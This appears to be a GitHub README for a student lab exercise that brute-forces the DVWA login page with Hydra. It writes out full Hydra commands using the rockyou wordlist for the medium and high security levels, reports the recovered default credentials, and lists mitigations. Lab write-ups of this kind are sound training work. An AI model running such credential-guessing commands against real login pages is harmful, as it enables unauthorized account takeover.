# DVWA Brute Force Attack using Hydra

## 📌 Project Overview
This project demonstrates a brute force attack on DVWA login functionality using Hydra.

## 🎯 Objective
- Perform password brute force attack
- Identify weak credentials
- Analyze authentication security

## 🛠️ Tool Used
- Hydra

## 🌐 Target
http://192.168.114.131/dvwa

---

## ⚙️ Attack Method

### Command Used (Medium Security)
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.114.131 http-get-form "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie:PHPSESSID=SESSION; security=medium:F=Username and/or password incorrect."

### Command Used (High Security)
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.114.131 http-get-form "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie:PHPSESSID=SESSION; security=high:F=Username and/or password incorrect."

---

## 🔓 Result

✔ Username: admin  
✔ Password: password  

---

## ⚠️ Security Impact
- Unauthorized login access
- Account takeover risk
- Weak authentication system

---

## 🛡️ Mitigation
- Use strong passwords
- Implement account lockout policy
- Enable CAPTCHA
- Use multi-factor authentication (MFA)

---

## 📷 Screenshots
See `<img width="968" height="298" alt="hydra" src="https://github.com/user-attachments/assets/5dc52fdc-09c0-44b2-a934-521d18cf1fa4" /><img width="957" height="311" alt="hydra 2" src="https://github.com/user-attachments/assets/d7d2186b-955b-4eb1-bf75-8043521caef9" />

`

---

## 📚 Learning Outcome
- Practical brute force attack execution
- Understanding authentication weaknesses
- Real-world attack simulation

⚠️ This project is conducted in DVWA lab for educational purposes only.
